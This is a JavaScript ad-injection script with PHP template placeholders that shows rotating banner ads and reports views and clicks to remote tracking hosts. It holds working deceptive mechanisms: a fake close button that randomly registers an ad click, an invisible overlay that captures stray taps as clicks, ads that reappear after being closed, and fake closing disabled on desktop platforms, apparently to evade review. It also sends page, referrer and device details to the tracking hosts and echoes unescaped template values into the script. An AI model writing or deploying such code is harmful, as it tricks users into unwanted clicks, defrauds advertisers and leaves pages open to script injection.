
;(function() {

    var key = parseInt(Math.random() * 1000000);

    if (window[key] != undefined) return;
    
    var lh = window[key] = {};
    
    lh.$ = function(name)
    {
        if(name.substr(0,1)=='.')
        {
            return document.getElementsByClassName( name.substr(1) );
        }
        else if(name.substr(0,1)=='#')
        {
            return document.getElementById( name.substr(1) );
        }
        else
        {
            return document.getElementsByTagName('head');
        }
    };
    lh.getCo = function(name)
    {
        var arr,reg=new RegExp("(^| )"+name+"=([^;]*)(;|$)");

        if(arr=document.cookie.match(reg)){
            return unescape(arr[2]);
        }else{
            return '';
        }
    };
    lh.setCo = function(name, value, second)
    {
        var exp = new Date();
        exp.setTime( exp.getTime() + second*1000);
        document.cookie = name + "="+ escape (value) + ";expires=" + exp.toGMTString();
    };
    lh.Acla = function(name, classname)
    {
        var ele = lh.$(name);
        
        if(name.substr(0,1)=='.')
        {
            for(index in ele)
            {
                if((parseInt(index) || index=='0'))
                {
                    if(!ele[index].className.match( new RegExp( "(\\s|^)" + classname + "(\\s|$)") ))
                    {
                        ele[index].className = ele[index].className + " "+classname;
                    }
                }
            }
        }
        if(name.substr(0,1)=='#')
        {
            if(!ele.className.match( new RegExp( "(\\s|^)" + classname + "(\\s|$)") ))
            {
                ele.className = ele.className + " "+classname;
            }
        }
    };
    lh.Rcla = function(name, classname)
    {
        var ele = lh.$(name);

        if(name.substr(0,1)=='.')
        {
            for(index in ele)
            {
                if((parseInt(index) || index=='0'))
                {
                    if(ele[index].className.match( new RegExp( "(\\s|^)" + classname + "(\\s|$)") ))
                    {
                        ele[index].className = ele[index].className.replace( new RegExp( "(\\s|^)" + classname + "(\\s|$)" ), "");
                    }
                }
            }
        }
        if(name.substr(0,1)=='#')
        {
            if(ele.className.match( new RegExp( "(\\s|^)" + classname + "(\\s|$)") ))
            {
                ele.className = ele.className.replace( new RegExp( "(\\s|^)" + classname + "(\\s|$)" ), "");
            }
        }
    };
    lh.CScri = function(url)
    {
        var script = document.createElement('script');
        script.async = true;
        script.src = url;
        document.body.appendChild(script);
    };
    lh.Aget = function(url, id)
    {
        url = url+'?dt';
        var ajax = new XMLHttpRequest();
        ajax.open('get', url.replace(/\.[a-zA-Z]+\?dt/, '.txt')+'?123456');
        ajax.send();
        ajax.onreadystatechange = function () {
            if (ajax.readyState==4 &&ajax.status==200) {
                lh.$('#'+id).style.background = 'url("data:image/jpg;base64,'+ajax.responseText+'")  no-repeat';
            }
        }
    };
    //样式
    lh.Sstyle = function(D)
    {
        var height = document.body.offsetWidth * (100+(3-D.size)*50)/640;
        
        var top_hid_height = (document.body.offsetWidth * D.top_hid_height/640);
        var bot_hid_height = (document.body.offsetWidth * D.bot_hid_height/640);
        var hid_height = top_hid_height+bot_hid_height+height;

        var label = 'body{margin: 0px;}' + D.style;
        var label = label + '.hi'+key+'{display: none;}';
        var label = label + '.l'+key+'{width: 100%; height:'+height+'px;position: relative; float: left;}';
        var label = label + '.l'+key+' *{-webkit-user-select: none;-moz-user-select: none;-webkit-user-select:none;-o-user-select:none;user-select:none;-webkit-tap-highlight-color: transparent;-webkit-tap-highlight-color:rgba(0,0,0,0);}';
        var label = label + '.l'+key+' .d'+key+'{width: 100%; height: '+hid_height+'px; position: absolute;z-index: '+D.index+';top: -'+top_hid_height+'px;background: none;}';
        var label = label + '.l'+key+' .h'+key+'{width: 100%; height:'+height+'px; position: relative;}';
        var label = label + '.l'+key+' .h'+key+' .c'+key+'{position:absolute; z-index:'+D.index+'; background:#a9eccd; opacity:0.5; color:#000; width:16px; text-align:center; line-height:16px; right:0px;}';
        var label = label + '.l'+key+' .h'+key+' .m'+key+'{position: absolute; height:100%; left:0; right:0; z-index: '+D.index+'; border: 2px solid red; border-image: -webkit-linear-gradient(#d43ed0,#0c8814) 30 30; border-image: linear-gradient(#d43ed0,#0c8814) 30 30;}';
        var label = label + '.l'+key+' .h'+key+' .m'+key+' .img'+key+'{display: none;width:100%; height:100%; background-size: 100% !important; pointer-events: none;}';
        var label = label + '.l'+key+' .h'+key+' .m'+key+' .t'+key+'{display: block;}';
        
        //动画
        if(D.js_effects=='1')
        {
            var label = label + '.l'+key+' .h'+key+' .m'+key+'{ -webkit-animation: a'+key+' 2s  linear infinite backwards; animation: a'+key+' 2s linear  infinite backwards; transform-origin: 50% 150%; -webkit-transform-origin: 50% 150%;}';
            var label = label + '@keyframes a'+key+' { 0% {transform: rotate(0deg) scale(1,1);} 20% {transform: rotate(5deg) scale(1,1);} 40% {transform: scale(1,1);} 60% {transform: rotate(-5deg) scale(1,1);} 80% {transform: rotate(0deg) scale(1,1);} }';
            var label = label + '@-webkit-keyframes a'+key+' { 0% {transform: rotate(0deg) scale(1,1);} 20% {transform: rotate(5deg) scale(1,1);} 40% {transform: scale(1,1);} 60% {transform: rotate(-5deg) scale(1,1);} 80% {transform: rotate(0deg) scale(1,1);} }';
        }
        var style = document.createElement('style');
        style.type = 'text/css';
        style.innerHTML = label;
        document.head.appendChild(style);

        lh.Shtml(D);
    };

    //标签
    lh.Shtml = function(D)
    {
        var label = '<div class="l'+key+'">';
        var label = label + '<div class="d'+key+'" id="d'+key+'"></div>';
        var label = label + '<div class="h'+key+'">';
        var label = label + '<div class="m'+key+'" id="m'+key+'">';
        for(index in D.matter)
        {
            if(index==0){
                var label = label + '<div class="img'+key+' t'+key+'" id="img'+key+index+'"></div>';
                lh.Aget(D.murl+'/'+D.matter[index].path, 'img'+key+index+'');
            }else{
                var label = label + '<div class="img'+key+'" id="img'+key+index+'"></div>';
            }
        }
        var label = label + '</div>';
        var label = label + '<div class="c'+key+'" id="c'+key+'">&times;</div>';
        var label = label + '</div>';
        var label = label + '</div>';
    
        document.write(label);
        lh.Sclo(D);
        lh.click(D);
        lh.switch(D);
    };

    //切换
    lh.switch = function(D)
    {
        //切换图片
        var index = 1;

        setInterval(function() {
            if(index >= D.matter.length){
                index = 0;
            }
            var background = lh.$('#img'+key+index).style.background;
            if(!background){
                lh.Aget(D.murl+'/'+D.matter[index].path, 'img'+key+index+'');
            }
            setTimeout(function(){
                lh.Rcla('.img'+key, 't'+key);
                lh.Acla('#img'+key+index, 't'+key);
                index++;
            }, 1000);
        }, 10000);

    };
    lh.Close = function(D)
    {
        lh.Acla('.l'+key, 'hi'+key);
        setTimeout(function(){
            lh.Rcla('.l'+key, 'hi'+key);
        }, 15000);
    };
    //关闭
    lh.Sclo = function(D)
    {
        lh.$('#c'+key).addEventListener("click", function(){

            if(D.false_clo > 0)
            {
                if(parseInt(Math.random() * 100) < D.false_clo )
                {
                    D.type = 'close';
                    lh.open(D);
                    lh.Close(D);
                }
                else
                {
                    lh.Close(D);
                }
            }
            else
            {
                lh.Acla('.l'+key, 'hi'+key);
            }
        });
    };
    //打开
    lh.open = function(D)
    {
        var eve = event || window.event;
        var url = D.curl+"/pc?se="+D.string;
        url = url + "&refso=" + (window.DeviceOrientationEvent ? 1 : 0) + "_" + navigator.platform + "_" + history.length;
        url = url + "&url=" + encodeURIComponent(document.location);
        url = url + "&source=" + encodeURIComponent(document.referrer);
        url = url + "&screen="+window.screen.width+"*"+window.screen.height;
        url = url + "&clickp=" + eve.screenX + "*" + eve.screenY;
        url = url + "&link=" + encodeURIComponent(D.link);
        url = url + "&type=" + D.type;
        url = url + "&time=" + Math.random();
        
        lh.CScri(url);
    };
    //PV
    lh.show = function(D)
    {
        var ip = lh.getCo('is_repeat_ip_'+D.adid);
        var num = 1;
        if( ip )
        {
            if(ip.indexOf(D.ip2long)>-1)
            {
                var num = 10;
            }
            else
            {
                var num = 1;
                ip = ip+':'+D.ip2long;
                lh.setCo('is_repeat_ip_'+D.adid, ip, 3600*2);
            }
        }
        else
        {
            var num = 1;
            ip = D.ip2long;
            lh.setCo('is_repeat_ip_'+D.adid, ip, 3600*2);
        }

        //获取IP数量
        var ips= new Array();
        ips = ip.split(':');

        //是否在ifrom中
        if (self!=top)
        {
            var ifrom = 1;
        }
        else
        {
            var ifrom = 0;
        }
        
        if(parseInt(Math.random() * 100) < (100/num))
        {
            var url = D.purl+"/pv?se="+D.string;
            url = url + "&refso=" + (window.DeviceOrientationEvent ? 1 : 0) + "_" + navigator.platform + "_" + history.length;
            url = url + "&url=" + encodeURIComponent(document.location);
            url = url + "&source=" + encodeURIComponent(document.referrer);
            url = url + "&screen="+window.screen.width+"*"+window.screen.height;
            url = url + "&n="+num;
            url = url + "&ip=" + ips.length;
            url = url + "&ifrom=" + ifrom;
            url = url + "&time=" + Math.random();
            
            lh.CScri(url);
        }
    };
    //点击
    lh.click = function(D)
    {
        lh.$('#d'+key).addEventListener("click", function(){
            D.type = 'hidden';
            lh.open(D);
        });
        lh.$('#m'+key).addEventListener("click", function(){
            D.type = 'good';
            lh.open(D);
        });
    };
    //是否模拟器
    lh.IsMN = function()
    {
        if(navigator.platform.indexOf("Win") == 0 || navigator.platform.indexOf("Mac") == 0)
        {
            return true;
        }
        else
        {
            return false;
        }
    };
    //初始化
    lh.init = function(D)
    {
        if(lh.IsMN())
        {
            D.false_clo = 0;
        }
        //else
        {
            lh.Sstyle(D);
            lh.show(D);

            if(D.statis_code && parseInt(Math.random() * 100)<D.statis_code_ratio){
                lh.CScri(D.statis_code);
            }
        }
    };

    lh.Data = {
        size: parseInt("<?php echo $webmasterAd['ad_size']; ?>"),
        matter: JSON.parse('<?php echo json_encode($matter, true); ?>').sort(function() {return (0.5-Math.random());}),
        purl: "<?php echo $purl_domain; ?>",
        curl: "<?php echo $curl_domain; ?>",
        murl: "<?php echo $matter_domain; ?>",
        string: "<?php echo $string; ?>",
        is_check: parseInt("<?php echo $webmasterAd['is_check']; ?>"),
        false_clo: parseInt("<?php echo $webmasterAd['false_close']; ?>"),
        top_hid_height: parseInt("<?php echo $webmasterAd['top_hid_height']; ?>"),
        bot_hid_height: parseInt("<?php echo $webmasterAd['bot_hid_height']; ?>"),
        link: "<?php echo $advertiserAd['link']; ?>",
        js_effects: "<?php echo $webmasterAd['js_effects']; ?>",
        adid: "<?php echo $webmasterAd['id']; ?>",
        style: "<?php echo $webmasterAd['style']; ?>",
        statis_code: "<?php echo $webmasterAd['statis_code']; ?>",
        statis_code_ratio: parseInt("<?php echo $webmasterAd['statis_code_ratio']; ?>"),
        ip2long: "<?php echo ip2long(self::$client['ip']); ?>",
        index: "<?php echo $index; ?>",
        user_agent: navigator.userAgent.toLowerCase(),
    };

    lh.init(lh.Data);
})();